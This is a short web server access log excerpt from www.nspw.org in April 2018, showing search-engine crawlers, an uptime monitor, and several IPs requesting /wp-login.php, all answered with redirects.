www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:22:28:35 -0400] "GET /2002/?C=S%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:22:28:49 -0400] "GET /node/62 HTTP/1.1" 302 506 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 82.61.32.97 - - [30/Apr/2018:22:29:04 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 82.61.32.97 - - [30/Apr/2018:22:29:06 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.160.167.73 - - [30/Apr/2018:22:29:15 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.160.167.73 - - [30/Apr/2018:22:29:16 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 191.6.126.101 - - [30/Apr/2018:22:31:09 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 191.6.126.101 - - [30/Apr/2018:22:31:13 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 40.77.167.206 - - [30/Apr/2018:22:31:28 -0400] "GET /papers/1999/nspw1999-markham.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:22:32:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 201.170.9.63 - - [30/Apr/2018:22:33:24 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 201.170.9.63 - - [30/Apr/2018:22:33:27 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 40.77.167.108 - - [30/Apr/2018:22:33:50 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 170.83.169.37 - - [30/Apr/2018:22:36:09 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 170.83.169.37 - - [30/Apr/2018:22:36:11 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:22:37:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
